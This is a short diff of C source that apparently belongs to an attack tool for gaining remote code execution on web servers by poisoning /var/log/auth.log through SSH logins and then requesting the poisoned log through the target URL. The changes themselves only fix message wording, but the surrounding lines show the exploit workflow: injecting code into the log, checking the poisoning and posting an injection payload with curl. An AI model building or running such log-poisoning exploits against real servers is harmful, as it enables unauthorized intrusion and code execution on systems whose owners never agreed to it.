@@ -67,7 +67,7 @@ char *auth_log_rce(const char *target, const char *code)
 	request_init_fh(&req);
 
 	if ((fh = randomfile(buf, 10)) == NULL)
-		die("error while generate tmp file\n");
+		die("error while generating tmp file\n");
 
 	curl_easy_setopt(req.ch, CURLOPT_URL, target);
 	curl_easy_setopt(req.ch, CURLOPT_POSTFIELDS, inject);
@@ -132,15 +132,15 @@ int check_auth_poison(const char *target)
 
 void prepare_auth_log_rce(const char *url, const char *ssh_target, int ssh_port)
 {
-	info("checking /var/log/auth.log poison ...\n");
+	info("checking /var/log/auth.log poison...\n");
 	if (check_auth_poison(url)) {
 		good("ok\n");
 		return;
 	}
 
-	info("error, trying inject code in log file ...\n");
+	info("error, trying inject code in log file...\n");
 	if (auth_log_poison(ssh_target, ssh_port)) {
-		info("log injection done, checking file ...\n");
+		info("log injection done, checking file...\n");
 		if (check_auth_poison(url)) {
 			good("injection sucessfull\n");
 		} else {
